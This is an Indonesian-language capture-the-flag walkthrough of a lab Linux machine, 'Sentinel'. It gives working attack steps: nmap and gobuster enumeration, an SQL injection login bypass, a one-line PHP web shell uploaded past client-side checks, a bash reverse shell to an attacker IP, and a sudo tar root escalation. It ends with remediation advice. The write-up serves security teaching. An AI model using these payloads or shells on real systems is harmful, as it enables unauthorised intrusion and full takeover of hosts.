**Sentinel** adalah mesin berbasis Linux dengan tingkat kesulitan *Medium* yang menguji ketelitian dalam fase enumerasi layanan web, manipulasi parameter autentikasi SQL, serta analisis izin eksekusi `sudo` di lingkungan Linux.

## 1. Enumeration & Reconnaissance

Pemindaian port penuh menggunakan **Nmap** dilakukan untuk mengidentifikasi layanan yang berjalan pada target (`10.10.11.42`):

```bash
nmap -sC -sV -p- --min-rate=1500 -oN nmap_sentinel.txt 10.10.11.42
```

Hasil pemindaian menunjukkan dua port utama yang terbuka:

* **Port 22/tcp**: OpenSSH 8.9p1 Ubuntu
* **Port 80/tcp**: nginx 1.18.0 (Ubuntu)

### Directory & Virtual Host Fuzzing

Pencarian direktori tersembunyi menggunakan **Gobuster** menemukan panel administrasi internal pada path `/portal-admin`:

```bash
gobuster dir -u [http://10.10.11.42](http://10.10.11.42) -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

## 2. Foothold: SQL Injection Authentication Bypass

Saat mengakses `http://10.10.11.42/portal-admin/login.php`, aplikasi menampilkan formulir autentikasi staf. Permintaan `POST` ditangkap menggunakan **Burp Suite** untuk menguji sanitasi input pada parameter `username`:

```http
POST /portal-admin/login.php HTTP/1.1
Host: 10.10.11.42
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1-- -&password=password123
```

Aplikasi tidak menggunakan *Prepared Statements* sehingga payload `' OR 1=1-- -` berhasil melewati validasi login dan memberikan sesi administrator.

### Remote Code Execution via File Upload

Di dalam dasbor administrator terdapat fitur unggah laporan diagnostik sistem. Validasi ekstensi hanya dilakukan di sisi klien (*JavaScript*). Dengan mengubah nama file menjadi `diag.php` dan menyisipkan *web shell* sederhana melalui Burp Repeater:

```php
<?php system($_GET['cmd']); ?>
```

Akses ke `http://10.10.11.42/portal-admin/uploads/diag.php?cmd=id` mengonfirmasi eksekusi perintah sebagai pengguna `www-data`. Selanjutnya, *reverse shell* dikirimkan ke mesin penyerang:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'
```

## 3. Lateral Movement ke User

Setelah mendapatkan akses interaktif, enumerasi file konfigurasi aplikasi di `/var/www/html/portal-admin/config.php` mengungkap kredensial database yang ternyata digunakan kembali (*password reuse*) oleh pengguna sistem `secops`:

```bash
su - secops
cat ~/user.txt
```

## 4. Privilege Escalation (Root)

Pemeriksaan hak akses `sudo` milik pengguna `secops` menunjukkan adanya izin menjalankan utilitas pencadangan tanpa password:

```bash
sudo -l
```

Output terminal menampilkan:

```text
User secops may run the following commands on sentinel:
    (ALL) NOPASSWD: /usr/bin/tar
```

Mengacu pada teknik **GTFOBins**, biner `/usr/bin/tar` dapat dimanfaatkan untuk memanggil *interactive root shell* melalui parameter `--checkpoint-action`:

```bash
sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Perintah tersebut langsung memberikan akses `#` (*root*), memungkinkan pembacaan `/root/root.txt`.

## Mitigasi & Remediasi

1. **Gunakan Prepared Statements (PDO / MySQLi)** pada seluruh kueri database untuk mencegah *SQL Injection*.
2. **Terapkan Validasi File Upload di Sisi Server** (verifikasi MIME type, *magic bytes*, dan simpan file di luar *web root* tanpa izin eksekusi).
3. **Prinsip Least Privilege pada `sudoers`**: Hindari memberikan izin `NOPASSWD` pada biner umum seperti `tar`, `find`, atau `vim`.
